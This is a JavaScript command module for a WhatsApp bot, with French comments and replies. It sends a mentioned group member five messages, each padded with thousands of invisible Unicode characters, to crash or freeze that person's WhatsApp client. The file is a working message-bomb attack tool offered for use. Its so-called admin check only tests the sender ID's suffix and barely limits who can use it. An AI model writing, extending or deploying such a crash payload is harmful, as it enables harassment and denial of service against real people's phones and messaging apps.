export async function execute(conn, msg, args) {
  const from = msg.key.remoteJid;
  const sender = msg.key.participant || msg.key.remoteJid;

  // Vérif admin (adapter selon ta gestion)
  if (!sender.endsWith("@s.whatsapp.net")) {
    await conn.sendMessage(from, { text: "❌ Seul un admin peut utiliser cette commande." });
    return;
  }

  // Vérif mentionné
  const mention = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!mention) {
    await conn.sendMessage(from, { text: "❌ Mentionne un membre à crasher." });
    return;
  }

  // Vérif whitelist
  if (global.whitelist.includes(mention)) {
    await conn.sendMessage(from, { text: "⚠️ Impossible de crasher un membre whitelisté." });
    return;
  }

  // Construction du message crash (exemple basique)
  const crashPayload = "\u200B".repeat(4000) + "\u2063".repeat(4000) + "💥💥💥";

  try {
    for (let i = 0; i < 5; i++) {
      await conn.sendMessage(from, {
        text: `@${mention.split("@")[0]} ${crashPayload}`,
        mentions: [mention],
      });
    }
    await conn.sendMessage(from, { text: `💥 Crash envoyé à @${mention.split("@")[0]}.`, mentions: [mention] });
  } catch (e) {
    await conn.sendMessage(from, { text: "❌ Erreur lors de l'envoi du crash." });
  }
          }
